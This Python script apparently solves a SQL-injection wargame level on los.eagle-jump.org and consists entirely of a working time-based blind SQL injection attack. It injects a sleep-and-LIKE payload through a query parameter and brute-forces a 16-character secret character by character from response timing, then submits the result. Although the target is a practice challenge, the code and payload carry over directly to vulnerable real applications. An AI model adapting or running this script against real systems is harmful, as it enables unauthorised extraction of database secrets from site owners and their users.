import requests
import time

url = 'https://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php'

cookies = {
	'__cfduid': '',
	'PHPSESSID': ''
}

payload = {
	'flag': ''
}

payload['flag'] = '1'
res = requests.get(url, cookies=cookies, params=payload)
print(res.text)

len_of_flag = 16
wait_time = 3
characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

# Guess the password one by one.
flag = ''
for i in range(1, len_of_flag+1):
	for c in characters:
		flag += c
		sqli = 'sleep(%d * (flag like \'%s%%\'))^(SELECT 1 UNION SELECT 2)' % (wait_time, flag)
		payload['flag'] = sqli
		print(sqli, len(sqli))
		start_time = time.time()
		res = requests.get(url, cookies=cookies, params=payload)
		end_time = time.time()
		print(res.text)
		if end_time - start_time >= wait_time:
			print('Gotcha!')
			break
		else:
			flag = flag[:-1]
		
	print('Sniff Sniff...', flag)

flag = flag.lower()
print('The flag is', flag)

payload['flag'] = flag
res = requests.get(url, cookies=cookies, params=payload)
print(res.text)